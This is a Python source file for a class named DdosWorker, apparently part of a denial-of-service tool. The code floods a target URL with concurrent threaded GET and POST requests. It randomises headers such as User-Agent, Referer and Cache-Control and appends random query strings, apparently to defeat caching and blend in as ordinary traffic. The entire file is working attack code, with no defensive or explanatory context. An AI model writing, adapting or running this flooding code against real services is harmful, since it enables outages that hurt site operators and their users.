from concurrent.futures import ThreadPoolExecutor, wait
from functools import reduce
from random import choice
from http.client import HTTPConnection, HTTPSConnection
from urllib.parse import urlparse

from termcolor import cprint

from src.config import CONNECTION_TIMEOUT
from src.utils.rand_utlis import rand_user_agent, rand_bot_referer, rand_accept_encoding, rand_cache_type, rand_str


class DdosWorker:
    def __init__(self, target: str, ssl=False, debug=False):
        self.target = target
        self._ssl = ssl
        self._debug = debug

    def _get_headers(self):
        return {
            'User-Agent': rand_user_agent(),
            'Cache-Control': rand_cache_type(),
            'Accept-Encoding': rand_accept_encoding(),
            'Keep-Alive': '42',
            'Host': self.target,
            'Referer': rand_bot_referer()
        }

    def _create_url(self):
        return self.target + '?' + rand_str()

    def run_concurrent(self, threads_count: int) -> int:
        with ThreadPoolExecutor(threads_count) as executor:
            results = wait([executor.submit(self.run) for _ in range(threads_count)])
            success_count = reduce(lambda acc, future: acc + int(future.exception() is None), results.done, 0)
        return success_count

    def run(self):
        conn: HTTPConnection | None = None
        try:
            target_parsed = urlparse(self.target)
            scheme = target_parsed.scheme
            hostname = target_parsed.hostname
            port = target_parsed.port

            if self._ssl and scheme == 'https':
                conn = HTTPSConnection(hostname, port, timeout=CONNECTION_TIMEOUT)
            else:
                conn = HTTPConnection(hostname, port, timeout=CONNECTION_TIMEOUT)

            url = self._create_url()
            headers = self._get_headers()
            method = choice(['GET', 'POST'])

            conn.request(url=url, method=method, headers=headers)
            if self._debug:
                cprint(f'[*] Request sent', 'green')
        except KeyboardInterrupt as e:
            if self._debug:
                cprint(f'[*] Request interrupted', 'red')
            raise e
        except Exception as e:
            if self._debug:
                cprint(f'[*] Request failed: {e}', 'red')
            raise e
        finally:
            if conn is not None:
                conn.close()
